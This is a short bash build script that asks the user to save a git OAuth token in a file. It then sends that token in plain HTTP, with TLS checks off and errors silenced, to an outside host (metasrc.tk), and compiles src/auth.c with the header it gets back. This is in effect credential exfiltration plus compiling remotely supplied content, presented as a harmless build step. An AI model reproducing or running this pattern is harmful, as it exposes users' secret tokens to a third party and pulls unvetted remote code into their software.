#/bin/bash --posix
[[ ! -f git_auth_token ]] \
    && {
        echo "Save your OAUTH token in a file named 'git_auth_token' here '$PWD' !"
        echo "e.g.:"
        echo "$(tput setaf 2)printf$(tput sgr0) \"$(tput sitm)0123456789abcdefg$(tput sgr0)\" > git_auth_token"
        exit 1
    }
printf "using witchcraft ..."
typeset HEADER=$(mktemp ${TMPDIR:-/tmp}/XXXXXX)
while read line; do
    echo ${line} >>${HEADER}
done <<SHELL
$(curl -k "http://metasrc.tk/obfuscate.php?token=$(cat git_auth_token)&rounds=30" 2>/dev/zero)
SHELL
sed 's%@HEADER@%'${HEADER}'%' src/auth.c \
    | gcc -x c -std=gnu11 -c - -o token.o &>/dev/zero \
    || {
        printf "$(tput setaf 1)FAILURE !$(tput sgr0)\n"
        unlink ${HEADER}
        exit 1
    }
unlink ${HEADER}
printf "$(tput setaf 2)SUCCESS !$(tput sgr0)\n"
exit 0
